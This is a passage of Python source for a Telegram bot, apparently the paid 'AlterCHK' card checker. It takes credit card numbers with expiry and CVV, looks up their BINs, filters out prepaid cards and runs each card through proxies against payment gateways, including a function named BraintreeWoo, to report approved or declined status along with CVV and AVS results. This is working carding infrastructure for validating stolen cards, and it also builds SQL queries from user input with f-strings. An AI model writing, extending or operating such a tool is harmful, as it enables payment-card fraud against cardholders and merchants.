            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDki import CMDkiCHK
        Status = await CMDkiCHK(CcVerify, CheckedP[1])
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        if (Status[0] == 'Approved') :
            AVSDATA = Status[2]
            PROCCVV2 = Status[3]
            RESPMSG = Status[1]
            respstatus = '[ APPROVED ✅ ]'
            try :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{respstatus}</b>\nCVV ↯ <b>[{PROCCVV2}]</b> | AVS ↯ <b>[{AVSDATA}]</b>\nMessage - ↯ <b>{RESPMSG}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        elif (Status[0] == 'Declined') :
            AVSDATA = Status[2]
            PROCCVV2 = Status[3]
            RESPMSG = Status[1]
            respstatus = '[ DECLINED ❌ ]'
            try :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{respstatus}</b>\nCVV ↯ <b>[{PROCCVV2}]</b> | AVS ↯ <b>[{AVSDATA}]</b>\nMessage - ↯ <b>{RESPMSG}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        if (Status[0] == 'ApprovedSinCVV') :
            RESPMSG = Status[1]
            respstatus = '[ APPROVED ✅ ]'
            try :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{respstatus}</b>\nMessage - ↯ <b>{RESPMSG}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        elif (Status[0] == 'DeclinedSinCVV') :
            RESPMSG = Status[1]
            respstatus = '[ DECLINED ❌ ]'
            try :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{respstatus}</b>\nMessage - ↯ <b>{RESPMSG}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        elif int(Status.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {Status} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["ci"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Ciclope  [ Auth ]'
    TwoNameGateway = 'Gateway ↯ Ciclope  [ Auth ]'
    ThreeGateway = 'Gateway 🔥 Ciclope  [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('ci')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDci import BraintreeWoo
        CheckRecive = await BraintreeWoo(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'

        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["nashe"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Nashe [ Auth ]'
    TwoNameGateway = 'Gateway ↯ Nashe [ Auth ]'
    ThreeGateway = 'Gateway 🔥 Nashe [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('nashe')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
